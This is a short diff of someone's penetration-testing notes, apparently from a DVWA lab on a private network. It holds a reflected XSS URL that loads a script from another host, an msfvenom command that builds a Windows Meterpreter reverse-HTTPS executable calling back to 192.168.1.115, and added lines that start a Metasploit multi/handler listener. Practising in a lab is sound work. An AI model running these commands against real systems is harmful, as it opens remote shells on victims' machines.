@@ -20,3 +20,6 @@ http://192.168.1.123/dvwa/vulnerabilities/xss_r/?name=<script src="http://192.16
 
 MSFvenom
 msfvenom --payload windows/meterpreter/reverse_https LHOST=192.168.1.115 LPORT=8080 --format exe -o rev_https_8080.exe
+
+msfconsole
+use exploit/multi/handler -> to open port on my computer
